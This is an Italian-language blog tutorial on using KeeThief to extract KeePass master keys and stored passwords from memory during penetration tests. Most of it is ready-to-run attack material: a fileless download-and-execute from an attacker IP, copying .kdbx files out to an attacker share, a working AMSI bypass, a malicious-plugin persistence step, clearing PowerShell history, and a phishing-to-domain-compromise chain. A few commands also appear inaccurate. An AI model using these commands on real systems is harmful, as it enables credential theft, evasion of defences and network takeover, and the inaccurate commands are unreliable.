---
title: 'KeeThief: Estrarre Credenziali da KeePass durante un Penetration Test'
slug: keethief
description: 'KeeThief: come estrarre master key e credenziali da KeePass in un pentest. Dump memoria, decryption database e integrazione post-exploitation.'
image: /Gemini_Generated_Image_1uaqry1uaqry1uaq.webp
draft: true
date: 2026-02-07T00:00:00.000Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - credential dumping
  - active directory
---

# KeeThief: Estrarre Credenziali da KeePass durante un Penetration Test

## Introduzione

KeePass è uno dei password manager più diffusi in ambienti enterprise. Lo trovi sulle workstation degli amministratori di sistema, sui laptop dei developer, nelle jump box. Quando durante un engagement trovi un processo `KeePass.exe` attivo, hai davanti una cassaforte piena di credenziali — e KeeThief è lo strumento che la apre.

KeeThief opera estraendo la master key direttamente dalla memoria del processo KeePass in esecuzione. Non serve conoscere la password master, non serve bruteforce: il tool legge la chiave di decrittazione dalla RAM e la usa per decifrare il database `.kdbx`. Il risultato sono tutte le credenziali salvate dall'utente — password di dominio, chiavi SSH, token API, accessi a infrastrutture critiche.

Nella kill chain, ci troviamo nella fase di **Credential Access** (MITRE ATT\&CK T1555.004). Questo articolo copre l'intera operazione: dal rilevamento di KeePass sul target fino al dump completo delle credenziali e alla loro integrazione nella catena di attacco.

***

## Setup e Prerequisiti

KeeThief è un modulo PowerShell che si appoggia a KeePassLib. Il progetto originale è disponibile su GitHub (autore: HarmJ0y).

**Clone del repository:**

```bash
git clone https://github.com/GhostPack/KeeThief.git
```

La struttura contiene:

* `KeeThief.ps1` — script principale per il dump della master key
* `KeePassLib.dll` — libreria .NET per interagire con i database KeePass

**Trasferimento sul target Windows:**

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.22/KeeThief.ps1')
```

Oppure da disco:

```powershell
Import-Module .\KeeThief.ps1
```

**Requisiti:**

* Accesso al target con permessi dello stesso utente che ha KeePass aperto (o SYSTEM/admin locale)
* KeePass.exe in esecuzione con il database sbloccato
* PowerShell disponibile
* .NET Framework 4.0+ sul target

**Verifica che KeePass sia attivo:**

```powershell
Get-Process KeePass -ErrorAction SilentlyContinue
```

Output:

```
Handles  NPM(K)  PM(K)  WS(K)  CPU(s)     Id  ProcessName
-------  ------  -----  -----  ------     --  -----------
    438      35  78432  91256    12.44   3284  KeePass
```

Se il processo è presente e l'utente ha il database aperto, puoi procedere.

***

## Uso Base

Il flusso operativo è diretto: trova KeePass, estrai la master key, decifra il database.

**Step 1 — Estrai le master key da tutti i processi KeePass attivi:**

```powershell
Get-KeePassDatabaseKey
```

Output:

```
Database  : C:\Users\admin\Documents\passwords.kdbx
KeyType   : Password
Key       : Str0ngM@sterP@ss!
```

Questo è il caso più semplice: l'utente usa solo una password master. KeeThief la recupera dalla memoria del processo.

**Step 2 — Apri il database con le credenziali estratte:**

Puoi usare `kpcli` (KeePass CLI) sulla tua macchina:

```bash
kpcli --kdb passwords.kdbx
```

Inserisci la master key ottenuta quando richiesto.

**Step 3 — Se l'utente usa un key file combinato:**

```powershell
Get-KeePassDatabaseKey
```

Output:

```
Database  : C:\Users\admin\Documents\corp.kdbx
KeyType   : PasswordAndKeyFile
Key       : Summer2024!
KeyFile   : C:\Users\admin\Documents\corp.key
```

Devi scaricare sia il `.kdbx` che il `.key` per decifrare il database.

***

## Tecniche Operative

### Dump remoto via sessione [CrackMapExec](https://hackita.it/articoli/crackmapexec)

Se hai credenziali admin sul target ma non una shell interattiva:

```bash
crackmapexec smb 172.16.0.25 -u admin -p 'Password1' -M keepass_discover
```

Questo modulo cerca processi KeePass e file `.kdbx` sul target.

### Localizzare i database KeePass sul filesystem

Prima di usare KeeThief, identifica tutti i database presenti:

```powershell
Get-ChildItem -Path C:\ -Recurse -Filter *.kdbx -ErrorAction SilentlyContinue 2>$null | Select-Object FullName, LastWriteTime
```

Output:

```
FullName                                    LastWriteTime
--------                                    -------------
C:\Users\admin\Documents\passwords.kdbx     01/15/2025 14:32:11
C:\Users\svc-backup\Desktop\backup.kdbx     12/20/2024 09:15:44
```

Più database = più credenziali potenziali.

### Esportare tutte le entry in formato leggibile

Una volta aperto il database con la master key, esporta tutto:

```powershell
Get-KeePassEntry -DatabasePath C:\Users\admin\Documents\passwords.kdbx -MasterKey "Str0ngM@sterP@ss!"
```

Output:

```
Title     : Domain Admin
UserName  : CORP\da-admin
Password  : D0m@in_Adm!n_2025
URL       : ldap://dc01.corp.local

Title     : SSH Jump Box
UserName  : root
Password  : Jmb0x_R00t#99
URL       : ssh://jumpbox.corp.local

Title     : AWS Console
UserName  : aws-admin@corp.com
Password  : @WS_Pr0d_Acc3ss!
URL       : https://console.aws.amazon.com
```

Tre credenziali, tre vettori di attacco diversi. Il domain admin ti apre Active Directory, l'SSH ti dà pivoting, l'AWS ti porta nel cloud.

***

## Tecniche Avanzate

### Dump della master key con [Mimikatz](https://hackita.it/articoli/mimikatz) (alternativa)

Se KeeThief non funziona (AV/EDR lo blocca), puoi provare con Mimikatz per dumpare la memoria del processo:

```bash
mimikatz # privilege::debug
mimikatz # process::suspend /pid:3284
mimikatz # sekurlsa::minidump KeePass.dmp
```

Poi analizza il dump offline con KeeThief sulla tua macchina.

### KeePass senza master password (Windows User Account)

Alcune configurazioni KeePass usano l'account Windows come protezione aggiuntiva (DPAPI). In questo caso:

```powershell
Get-KeePassDatabaseKey
```

Output:

```
Database  : C:\Users\admin\Documents\corp.kdbx
KeyType   : WindowsUserAccount
DPAPI     : True
```

Il database è legato all'account Windows. Se sei nel contesto di quell'utente (o SYSTEM), il decrypt è trasparente. Altrimenti, devi prima estrarre la DPAPI master key dell'utente con Mimikatz:

```bash
mimikatz # dpapi::masterkey /in:"C:\Users\admin\AppData\Roaming\Microsoft\Protect\S-1-5-21-...\{guid}" /sid:S-1-5-21-... /password:UserPassword
```

### Persistence tramite plugin KeePass

KeePass supporta plugin. Puoi installare un plugin malevolo che logga ogni credenziale acceduta:

```powershell
Copy-Item .\KeeLogger.plgx "C:\Program Files\KeePass Password Safe 2\Plugins\"
```

Al prossimo avvio di KeePass, il plugin intercetta ogni operazione di copia password. Tecnica sofisticata per ingaggi prolungati dove serve raccolta credenziali continua.

### Accesso offline al database

Se KeePass non è in esecuzione ma trovi il `.kdbx`, trasferiscilo e tentane il crack:

```bash
keepass2john passwords.kdbx > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

RockYou contiene 14.3 milioni di entry. Il crack dipende dalla complessità della master password — con KDF Argon2d (default KeePass 2.x), aspettati \~100 tentativi/secondo su CPU.

***

## Scenari Pratici di Pentest

### Scenario 1: Workstation amministratore in rete enterprise

```powershell
Get-Process KeePass
Get-KeePassDatabaseKey
```

**Output atteso:**

```
Database  : C:\Users\it-admin\passwords.kdbx
KeyType   : Password
Key       : !tAdm1n_K33p@ss
```

**Cosa fare se fallisce:**

* `Access denied` → Non hai permessi sufficienti. Serve escalation a local admin o al contesto dell'utente KeePass. Prova token impersonation con Incognito o `Invoke-TokenManipulation`.
* KeePass in esecuzione ma database bloccato → L'utente ha bloccato il workspace. Aspetta che lo sblocchi (monitora con loop) o usa il dump della memoria offline.

**Timeline:** 15 secondi per il dump se le condizioni sono soddisfatte. 10-30 minuti se serve privilege escalation.

### Scenario 2: Terminal server con utenti multipli

Su un [RDP](https://hackita.it/articoli/rdp) server condiviso, più utenti potrebbero avere KeePass aperto:

```powershell
Get-Process KeePass -IncludeUserName
```

Output:

```
UserName          Id  ProcessName
--------          --  -----------
CORP\admin      3284  KeePass
CORP\svc-sql    5128  KeePass
CORP\hr-mgr     7412  KeePass
```

Come SYSTEM, puoi dumpare le chiavi di tutti:

```powershell
Get-KeePassDatabaseKey -All
```

**Cosa fare se fallisce:**

* Non sei SYSTEM → Usa `PsExec -s` o un servizio per ottenere il contesto SYSTEM.
* Alcuni processi non restituiscono key → Versione KeePass diversa o database chiuso. Controlla la versione con `(Get-Process KeePass).MainModule.FileVersionInfo`.

**Timeline:** 30 secondi per il dump multi-utente. Analisi credenziali 15-20 minuti.

### Scenario 3: KeePass con protezione key file su share di rete

```powershell
Get-KeePassDatabaseKey
```

Output:

```
Database  : C:\Users\admin\corp.kdbx
KeyType   : PasswordAndKeyFile
Key       : Corp2025!
KeyFile   : \\fileserver\keys$\corp.key
```

**Cosa fare se fallisce:**

* Key file su share non raggiungibile → Verifica le credenziali dell'utente per accedere alla share. Usa `net use \\fileserver\keys$ /user:CORP\admin Password` per montare.
* Share SMB bloccata → Cerca il key file nella cache locale: `dir C:\Users\admin\AppData\ /s /b *.key`.

**Timeline:** 1 minuto per il dump. 5 minuti per recuperare il key file remoto.

***

## Toolchain Integration

KeeThief si inserisce dopo l'accesso locale alla macchina target e alimenta direttamente le fasi successive dell'attacco.

**Flusso tipico:**

Initial Access → PrivEsc (local admin) → **KeeThief (credential dump)** → Lateral Movement con credenziali estratte

Le credenziali ottenute da KeePass vengono usate immediatamente con tool come CrackMapExec, Evil-WinRM o Impacket per espandere l'accesso nella rete. Scopri come integrare le credenziali estratte in tecniche di post-exploitation tramite strumenti come [Weevely3](https://hackita.it/articoli/weevely3) per mantenere l'accesso o [Scheduled Task](https://hackita.it/articoli/scheduled) per la persistenza.

**Passaggio dati concreto:**

```powershell
# KeeThief dump
Get-KeePassDatabaseKey
# Output: CORP\da-admin : D0m@in_Adm!n_2025

# Uso immediato con CrackMapExec
crackmapexec smb 172.16.0.0/24 -u da-admin -p 'D0m@in_Adm!n_2025' -d CORP
```

| Scenario                    | KeeThief               | Mimikatz (sekurlsa)      | LaZagne            | SharpChromium    |
| --------------------------- | ---------------------- | ------------------------ | ------------------ | ---------------- |
| Target                      | KeePass specifico      | LSASS / tutti i provider | Multi-applicazione | Chrome/Edge      |
| Richiede processo attivo    | Sì                     | Sì (LSASS)               | No                 | No               |
| Tipo credenziali            | Tutte le entry KeePass | Hash NTLM, ticket        | Password varie     | Password browser |
| Stealth                     | Medio                  | Basso                    | Medio              | Alto             |
| Output utilizzabile diretto | Sì (plaintext)         | Sì (hash/ticket)         | Sì                 | Sì               |

***

## Attack Chain Completa

**Obiettivo:** Domain admin tramite credenziali KeePass di un sysadmin.

**Fase 1 — Initial Access via phishing (40 min)**

Macro Office malevola inviata a un dipendente IT. La macro esegue una reverse shell PowerShell.

**Fase 2 — Enumerazione locale (10 min)**

```powershell
whoami /priv
Get-Process KeePass
Get-ChildItem C:\ -Recurse -Filter *.kdbx 2>$null
```

Trovi KeePass attivo sul PC del sysadmin.

**Fase 3 — Privilege Escalation (15 min)**

L'utente è local admin. Eleva a contesto dell'utente KeePass con token impersonation.

**Fase 4 — Credential Extraction con KeeThief (1 min)**

```powershell
Import-Module .\KeeThief.ps1
Get-KeePassDatabaseKey
```

Ottieni: `CORP\da-admin : D0m@in_Adm!n_2025`

**Fase 5 — Domain Compromise (20 min)**

```bash
crackmapexec smb dc01.corp.local -u da-admin -p 'D0m@in_Adm!n_2025' -d CORP
secretsdump.py CORP/da-admin:'D0m@in_Adm!n_2025'@dc01.corp.local
```

DCSync del domain controller. Dump di tutti gli hash NTLM del dominio.

**Fase 6 — Persistence (5 min)**

Golden ticket con krbtgt hash. Persistenza con [Scheduled Task](https://hackita.it/articoli/crontab) sul domain controller per mantenere accesso.

**Timeline totale:** \~90 minuti dal phishing al domain compromise.

***

## Detection & Evasion

### Cosa monitora il Blue Team

* Accesso alla memoria del processo KeePass.exe — EDR come CrowdStrike e Defender for Endpoint monitorano `ReadProcessMemory` su processi sensibili
* Caricamento di `KeePassLib.dll` da path non standard (temp, download, share)
* Script PowerShell che importano moduli sconosciuti — AMSI e ScriptBlock Logging catturano il contenuto

### Log rilevanti

* Windows Security Event ID 4663 → Object access su file `.kdbx`
* Sysmon Event ID 10 → Process Access (KeeThief che legge la memoria di KeePass)
* Sysmon Event ID 7 → Image Loaded (`KeePassLib.dll` da path anomalo)
* PowerShell Event ID 4104 → ScriptBlock Logging con contenuto dello script

### Tecniche di evasion

1. **AMSI bypass prima dell'import:** esegui un bypass AMSI prima di caricare KeeThief per evitare detection dello script:

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

1. **Minidump offline:** invece di eseguire KeeThief sul target, dumpa la memoria di KeePass con `ProcDump` (tool Microsoft legittimo) e analizzala sulla tua macchina:

```cmd
procdump.exe -ma 3284 keepass.dmp
```

ProcDump non viene flaggato perché è firmato Microsoft.

1. **Carica KeePassLib.dll da reflection:** evita il file su disco caricando la DLL direttamente in memoria con `[System.Reflection.Assembly]::Load()`.

### Cleanup

```powershell
Remove-Item .\KeeThief.ps1 -Force
Remove-Item .\KeePassLib.dll -Force
# Pulisci la PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
```

***

## Performance & Scaling

**Single target:** il dump della master key richiede meno di 1 secondo. La lettura del database dipende dalle dimensioni — un database con 500 entry si decifra in 2-3 secondi.

**Multi-target (terminal server):** su un server con 10+ utenti KeePass attivi, il dump sequenziale di tutti i processi richiede 5-10 secondi totali. L'output è una lista consolidata di tutte le credenziali.

**Consumo risorse:** KeeThief legge la memoria del processo senza impattare le performance. L'operazione è invisibile all'utente che sta usando KeePass.

**Scaling in rete:** combina con CrackMapExec per cercare KeePass su tutte le workstation del dominio:

```bash
crackmapexec smb 172.16.0.0/24 -u admin -p 'Pass' -x "tasklist /fi \"imagename eq KeePass.exe\""
```

Identifica i target, poi esegui KeeThief solo dove serve.

***

## Tabelle Tecniche

### Command Reference

| Comando                                 | Descrizione                                  |
| --------------------------------------- | -------------------------------------------- |
| `Get-KeePassDatabaseKey`                | Estrai master key da processi KeePass attivi |
| `Get-KeePassDatabaseKey -All`           | Dump multi-utente (richiede SYSTEM)          |
| `Get-Process KeePass`                   | Verifica processi KeePass in esecuzione      |
| `keepass2john file.kdbx > hash.txt`     | Estrai hash per crack offline                |
| `kpcli --kdb file.kdbx`                 | Apri database da CLI con master key          |
| `Get-ChildItem -Filter *.kdbx -Recurse` | Cerca database KeePass su disco              |

### KeeThief vs alternative per credential extraction da password manager

| Tool                | Target                         | Richiede processo attivo | Output             | Stealth |
| ------------------- | ------------------------------ | ------------------------ | ------------------ | ------- |
| KeeThief            | KeePass                        | Sì                       | Plaintext completo | ★★★☆    |
| keepass2john + John | KeePass (.kdbx)                | No                       | Hash → crack       | ★★★★    |
| LaZagne             | Multi (browser, KeePass, WiFi) | No                       | Plaintext          | ★★★☆    |
| Mimikatz DPAPI      | KeePass con WUA                | Sì (DPAPI)               | Plaintext          | ★★☆☆    |
| SharpKeePass        | KeePass                        | Sì                       | Plaintext          | ★★★☆    |

***

## Troubleshooting

| Problema                                       | Causa                               | Fix                                                                   |
| ---------------------------------------------- | ----------------------------------- | --------------------------------------------------------------------- |
| `Get-KeePassDatabaseKey` non restituisce nulla | Database bloccato (utente idle)     | Aspetta che l'utente sblocchi o usa social engineering                |
| `Access Denied` sulla memoria del processo     | Permessi insufficienti              | Escalation a local admin o SYSTEM                                     |
| `KeePassLib.dll not found`                     | DLL mancante nella stessa directory | Scarica e posiziona nella stessa cartella dello script                |
| AMSI blocca l'import                           | Windows Defender AMSI attivo        | Esegui bypass AMSI prima dell'import                                  |
| Versione KeePass non compatibile               | KeePass 1.x vs 2.x                  | KeeThief supporta KeePass 2.x. Per 1.x usa approccio diverso          |
| Database con key file non decifrabile          | Key file non trovato                | Cerca il key file nei path indicati dall'output o nelle share di rete |

***

## FAQ

**KeeThief funziona se KeePass è bloccato (locked)?**
No. La master key è disponibile in memoria solo quando il database è sbloccato. Se l'utente ha bloccato KeePass, devi aspettare che lo sblocchi.

**Serve essere admin locale?**
Devi avere accesso alla memoria del processo KeePass. Se l'utente KeePass è lo stesso con cui sei loggato, non serve admin. Se è un altro utente, serve SYSTEM o admin locale.

**Funziona con KeePassXC?**
No. KeeThief è specifico per KeePass 2.x (C#/.NET). KeePassXC è scritto in C++ e richiede un approccio diverso (dump memoria + analisi manuale).

**Come trasferisco il file .kdbx sulla mia macchina?**
Via SMB: `copy C:\Users\admin\passwords.kdbx \\10.10.14.22\share\`. Oppure base64 encode e paste: `certutil -encode passwords.kdbx b64.txt`.

**Posso automatizzare il dump su più macchine?**
Sì. Usa CrackMapExec con un modulo custom o Invoke-Command via WinRM per eseguire KeeThief remotamente su ogni workstation dove KeePass è attivo.

**Il database KeePass è protetto con Argon2?**
KeePass 2.x usa Argon2d come KDF di default. Il crack offline è lento (\~100 tentativi/sec su CPU). KeeThief bypassa completamente il KDF estraendo la chiave dalla memoria.

***

## Cheat Sheet

| Azione                       | Comando                                                                                                                                |
| ---------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| Trova processi KeePass       | `Get-Process KeePass`                                                                                                                  |
| Dump master key              | `Get-KeePassDatabaseKey`                                                                                                               |
| Dump multi-utente            | `Get-KeePassDatabaseKey -All`                                                                                                          |
| Trova file .kdbx             | `Get-ChildItem C:\ -Recurse -Filter *.kdbx 2>$null`                                                                                    |
| Crack offline                | `keepass2john file.kdbx > hash.txt && john hash.txt --wordlist=rockyou.txt`                                                            |
| Minidump per analisi offline | `procdump.exe -ma <PID> keepass.dmp`                                                                                                   |
| AMSI bypass                  | `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)` |
| Apri database CLI            | `kpcli --kdb file.kdbx`                                                                                                                |

***

**Disclaimer:** KeeThief è uno strumento di ricerca per penetration test autorizzati. L'accesso non autorizzato a credenziali altrui è un reato penale. Usa queste tecniche solo con autorizzazione scritta del proprietario del sistema. Repository: [github.com/GhostPack/KeeThief](https://github.com/GhostPack/KeeThief).

***

Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
